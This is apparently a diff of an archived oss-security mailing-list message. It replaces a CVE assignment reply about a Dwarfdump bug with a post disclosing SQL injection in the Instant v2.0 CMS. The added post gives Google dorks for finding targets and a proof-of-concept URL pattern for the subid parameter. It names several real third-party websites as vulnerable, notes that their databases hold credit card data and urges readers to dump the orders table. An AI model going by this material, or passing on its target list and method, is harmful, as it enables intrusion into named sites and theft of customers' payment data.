@@ -1,27 +1,76 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/03/14
-Message-ID: <Pine.LNX.4.64.1501031739410.1923@beijing.mitre.org>
-Date: Sat, 3 Jan 2015 17:40:27 -0500 (EST)
-From: cve-assign@...re.org
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/09/7
+Message-ID: <CADr4Fi-WXLkNrR2e2c9UMzJSS4BZiAKE__Ftj5EKYKq_if00+Q@mail.gmail.com>
+Date: Tue, 10 Mar 2015 02:09:32 +0700
+From: "Steevee a.k.a Stefanus" <steevee.aka@...il.com>
 To: oss-security@...ts.openwall.com
-cc: cve-assign@...re.org
-Subject: Re: CVE Request, Use after free vulnerability in Dwarfdump
+Subject: Instant v2.0 SQL Injection Vulnerability
 Content-Type: text/plain; charset=utf-8
 
+==========================================================================================
+Instant v2.0 SQL Injection Vulnerability
+==========================================================================================
 
-On Wed, 31 Dec 2014, xiaoqixue_1 wrote:
+:-------------------------------------------------------------------------------------------------------------------------:
+: # Exploit Title : Instant v2.0 SQL Injection Vulnerability
+: # Date : 10th March 2015
+: # Author : X-Cisadane
+: # CMS Name : Instant v2.0 (another OverCoffee production)
+: # CMS Developer : overcoffee.com
+: # Version : 2.0
+: # Category : Web Applications
+: # Vulnerability : SQL Injection
+: # Tested On : Google Chrome Version 40.0.2214.115 m (Windows 7), Havij
+1.16 Pro & SQLMap 1.0-dev-nongit-20150125
+: # Greetz to : Explore Crew, CodeNesia, Bogor Hackers Community, Ngobas
+and Winda Utari
+:-------------------------------------------------------------------------------------------------------------------------:
 
-> 
->we report a vulnerability in DwarfDump which is shipped
->with every release of the SGI MIPS/IRIX C compiler.
->we have reported the issue to vendor and linux Bugzilla:
->
->https://bugzilla.redhat.com/show_bug.cgi?id=1177758
+A SQL Injection Vulnerability has been discovered in the Instant v.2.0 CMS.
+The Vulnerability is located in the subid Value of the product_cat.php
+File. Attackers are able to execute own SQL commands
+by usage of a GET Method Request with manipulated subid Value.
+Attackers are able to read Database information by execution of own SQL
+commands.
 
-Use CVE-2014-9482.
+DORKS (How to find the target) :
+================================
+"Powered By Instant" inurl:/catalog/
+inurl:/product_cat.php?subid=
+Or use your own Google Dorks :)
 
----
+Proof of Concept
+================
 
-CVE assignment team, MITRE CVE Numbering Authority M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+SQL Injection
+PoC :
+http://[Site]/[Path]/product_cat.php/subid=['SQLi]
+And you have to change the URL structure to
+http://[Site]/[Path]/product_cat.php?subid=['SQLi]
+
+Example :
+http://www.cynthiawebbdesigns.com/catalog/product_cat.php/subid=16617/index.html?PHPSESSID=3ef7e156add41316201ffe87bd489a7d
+
+Just change the URL structure to
+http://www.cynthiawebbdesigns.com/catalog/product_cat.php?subid='16617
+And you'll see this error notice : You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL ...
+
+Note : This CMS stored Credit Card Infos on the Database, just open your
+Fav Tool and Dump the orders Table
+PIC / PoC : http://i59.tinypic.com/4l0poh.png
+
+Another Vuln Sites :
+http://www.unitymarketingonline.com/catalog/product_cat.php?subid=['SQLi]
+http://www.peacefulinspirations.net/catalog/product_cat.php?subid=['SQLi]
+http://www.dickensgifts.com/catalog/product_cat.php?subid=['SQLi]
+http://www.frogandprincellc.com/catalog/product_cat.php?subid=['SQLi]
+http://www.debrekht.com/catalog/product_cat.php?subid=['SQLi]
+... etc ...
+
+-= Regards =-
+ Steevee A.K.A
+
+Content of type "text/html" skipped
+
+View attachment "poc.txt" of type "text/plain" (2683 bytes)
